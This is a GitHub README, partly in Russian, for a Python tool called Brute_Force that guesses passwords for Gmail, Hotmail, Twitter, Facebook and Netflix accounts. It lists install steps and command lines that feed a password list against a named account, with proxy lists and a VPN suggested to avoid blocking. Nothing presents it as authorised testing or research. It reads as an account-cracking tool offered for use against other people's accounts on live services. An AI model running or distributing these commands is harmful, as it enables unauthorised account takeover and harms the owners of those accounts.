# Brute_Force
[![Python 3.10.2](https://img.shields.io/badge/3.10.2-Python-blue.svg)](https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe)
[![GPL](https://img.shields.io/badge/GPL-V3.0-red.svg)](https://www.gnu.org/licenses/gpl-3.0.html)
[![Termux](https://img.shields.io/badge/Termux-Android-brightgreen.svg)](https://termux.com/)
![platform](https://img.shields.io/badge/Platform-Linux%7CMacOS%7CWindows-brightgreen.svg)
![alt text](https://github.com/Kini-Noro/Brute/raw/main/.github/photo.PNG?raw=true)
## install :
```bash
sudo apt install python3 python3-pip

pip3 install proxylist

pip3 install mechanize
```


# Usage:

## Брутфорс Gmail
```bash
python3 Brute_Force.py -g Account@gmail.com -l File_list

python3 Brute_Force.py -g Account@gmail.com -p Password_Single
```


## Брутфорс Hotmail
```bash
python3 Brute_Force.py -t Account@hotmail.com -l File_list

python3 Brute_Force.py -t Account@hotmail.com -p Password_Single
```


## Брутфорс Twitter

```bash
python3 Brute_Force.py -T Account_Twitter -l File_list
python3 Brute_Force.py -T Account_Twitter -l File_list -X proxy-list.txt

```
## Брутфорс Facebook

```bash
python3 Brute_Force.py -f Account_facebook -l File_list
python3 Brute_Force.py -f Account_facebook -l File_list -X proxy-list.txt
```
## Брутфорс Netflix

```bash

Предпочтительно работает VPN
Start On Vpn
python3 Brute_Force.py -n Account_Netflix -l File_list
python3 Brute_Force.py -n Account_Netflix -l File_list -X proxy-list.txt


И с нетерпением ждем большего(^-^) 
